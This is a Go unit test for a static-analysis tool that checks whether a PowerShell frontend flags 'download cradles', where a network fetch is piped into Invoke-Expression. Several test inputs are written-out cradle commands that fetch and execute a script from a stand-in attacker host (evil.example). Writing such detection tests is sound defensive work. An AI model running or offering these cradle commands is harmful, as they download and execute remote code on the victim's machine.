package ps

import (
	"testing"

	"github.com/v0lka/flowsh/engine"
)

// hasCradle reports whether the result carries a CodeExec sink marked as
// reached by network content.
func hasCradle(res *Result) bool {
	for _, e := range res.Effects {
		if e.NetFlow == engine.FlowCradle {
			return e.Kind == engine.KindCodeExec
		}
	}
	return false
}

// TestLowerCradleMarking pins the frontend half of the PowerShell download
// cradle: a code-execution sink fed by a network fetch through a pipeline is
// marked FlowCradle, while a sink fed by local data, the same two commands on
// separate lines, or a non-executing consumer is not. The flow is established
// from the pipeline's value flow, never from the co-occurrence of an egress and
// a sink.
func TestLowerCradleMarking(t *testing.T) {
	cases := []struct {
		name string
		src  string
		want bool
	}{
		{"Invoke-WebRequest piped to Invoke-Expression", `Invoke-WebRequest https://evil.example/p.ps1 | Invoke-Expression`, true},
		{"curl alias piped to iex alias", `curl https://evil.example/x | iex`, true},
		{"Invoke-RestMethod piped to Invoke-Expression", `Invoke-RestMethod https://evil.example/x | Invoke-Expression`, true},
		{"separate lines are not a flow", "Invoke-WebRequest https://evil.example/p.ps1\nInvoke-Expression $x", false},
		{"local producer is not a flow", `Get-Content a.txt | Invoke-Expression`, false},
		{"egress alone is not a flow", `Invoke-WebRequest https://evil.example/x`, false},
		{"non-executing consumer is not a flow", `Invoke-WebRequest https://evil.example/x | Select-Object -First 1`, false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			r := lowerOK(t, tc.src)
			if got := hasCradle(r); got != tc.want {
				t.Errorf("%q: cradle=%v, want %v (effects=%+v)", tc.src, got, tc.want, r.Effects)
			}
		})
	}
}
